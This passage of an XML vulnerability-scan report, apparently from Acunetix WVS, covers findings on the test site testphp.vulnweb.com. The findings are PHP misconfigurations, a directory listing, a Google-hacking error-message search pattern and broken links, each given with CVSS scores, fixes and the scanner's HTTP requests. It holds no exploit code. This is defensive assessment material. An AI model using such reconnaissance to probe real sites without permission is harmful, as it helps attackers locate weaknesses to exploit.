          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/filesystem.configuration.php]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="96" color="orange">
       <Name><![CDATA[PHP open_basedir is not set]]></Name>
       <ModuleName><![CDATA[Scripting (PHPInfo.script)]]></ModuleName>
       <Details><![CDATA[This vulnerability was detected using the information from phpinfo() page <font color="dark">/secured/phpinfo.php</font><br/>open_basedir: <font color="dark"><b>no value</b></font>]]></Details>
       <Affects><![CDATA[/secured/phpinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Application dependant - possible remote code inclusion.]]></Impact>
       <Description><![CDATA[The open_basedir configuration directive will limit the files that can be opened by PHP to the specified directory-tree. When a script tries to open a file with, for example, fopen() or gzopen(), the location of the file is checked. When the file is outside the specified directory-tree, PHP will refuse to open it. open_basedir is a good protection against remote file inclusion vulnerabilities. For a remote attacker it is not possible to break out of the open_basedir restrictions if he is only able to inject the name of a file to be included. Therefore the number of files he will be able to include with such a local file include vulnerability is limited.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[You can set open_basedir from php.ini <br/><br/><b>php.ini</b><br/>open_basedir = your_application_directory<br/>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:53 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 45963
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Description of core php.ini directives]]></Database>
          <URL><![CDATA[http://php.net/ini.core]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="97" color="orange">
       <Name><![CDATA[PHP errors enabled]]></Name>
       <ModuleName><![CDATA[Scripting (PHPInfo.script)]]></ModuleName>
       <Details><![CDATA[This vulnerability was detected using the information from phpinfo() page <font color="dark">/secured/phpinfo.php</font><br/>display_errors: <font color="dark"><b>On</b></font>]]></Details>
       <Affects><![CDATA[/secured/phpinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Possible information disclosure.]]></Impact>
       <Description><![CDATA[The display_errors directive determines whether error messages should be sent to the browser. These messages frequently contain sensitive information about your web application environment, and should never be presented to untrusted sources. <br/><br/>display_errors is on by default.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[You can disable display_errors from php.ini or .htaccess.<br/><br/><b>php.ini</b><br/>display_errors = 'off'<br/>log_errors = 'on'<br/><br/><b>.htaccess</b><br/>php_flag  display_errors  off<br/>php_flag  log_errors  on]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:53 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 45963
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.error-reporting]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="98" color="orange">
       <Name><![CDATA[PHP session.use_only_cookies disabled]]></Name>
       <ModuleName><![CDATA[Scripting (PHPInfo.script)]]></ModuleName>
       <Details><![CDATA[This vulnerability was detected using the information from phpinfo() page <font color="dark">/secured/phpinfo.php</font><br/>session.use_only_cookies: <font color="dark"><b>On</b></font>]]></Details>
       <Affects><![CDATA[/secured/phpinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Application dependant - possible session hijacking.]]></Impact>
       <Description><![CDATA[When use_only_cookies is disabled, PHP will pass the session ID via the URL. This makes the application more vulnerable to session hijacking attacks. Session hijacking is basically a form of identity theft wherein a hacker impersonates a legitimate user by stealing his session ID. When the session token is transmitted in a cookie, and the request is made on a secure channel (that is, it uses SSL), the token is secure.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[You can enabled session.use_only_cookies from php.ini or .htaccess.<br/><br/><b>php.ini</b><br/>session.use_only_cookies = 'on'<br/><br/><b>.htaccess</b><br/>php_flag  session.use_only_cookies on<br/>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:06:53 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 45963
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/session.configuration]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="99" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /Mod_Rewrite_Shop/images/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/Mod_Rewrite_Shop/images]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/images/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:06 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 529
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="100" color="green">
       <Name><![CDATA[GHDB: Sablotron error message]]></Name>
       <ModuleName><![CDATA[GHDB]]></ModuleName>
       <Details><![CDATA[We found <pre wrap="virtual"><font color="blue">warning &quot;error on line&quot; php sablotron</font></pre>]]></Details>
       <Affects><![CDATA[/pictures/path-disclosure-unix.html]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Not available. Check description.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">The description for this alert is contributed by the GHDB community, it may contain inappropriate language.</font></div><br/><font color="navy">Category : Error Messages</font><br/><br/>Sablotron is an XML toolit thingie. This query hones in on error messages generated by this toolkit. These error messages reveal all sorts of interesting stuff such as source code snippets, path and filename info, etc.<br/><br/>The Google Hacking Database (GHDB) appears courtesy of the Google Hacking community.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Not available. Check description.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/path-disclosure-unix.html HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:11 GMT
Content-Type: text/html
Last-Modified: Mon, 08 Apr 2013 08:42:10 GMT
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 3936
]]></Response>
       </TechnicalDetails>
       <CWE id=""><![CDATA[]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <Au><![CDATA[]]></Au>
          <Audesc><![CDATA[]]></Audesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Google hacking]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/google-hacking/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="101" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/medias/css/main.css]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
